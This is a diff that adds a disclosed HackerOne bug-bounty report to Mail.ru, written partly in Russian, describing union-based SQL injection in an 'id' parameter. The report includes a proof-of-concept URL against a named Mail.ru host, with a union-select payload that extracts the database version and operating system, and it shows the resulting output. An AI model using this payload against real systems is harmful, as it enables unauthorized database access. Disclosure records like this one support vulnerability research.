@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/112555
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:01.02.2016 20:00:38
+
+Summary:
+SQL injection in out-of-scope project
+Добрый день. Параметр id попадает в SQL запрос без фильтрации. Вектор атаки - Union Based SQLi
+
+PoC
+
+http://mmkf.afisha.mail.ru/imgview.html?id=3713444279+and(0)union(select(concat_ws(0x2c,version(),@@version_compile_os)))
+
+вывод в сорцах страницы - 5.0.92-community-log:unknown-linux-gnu
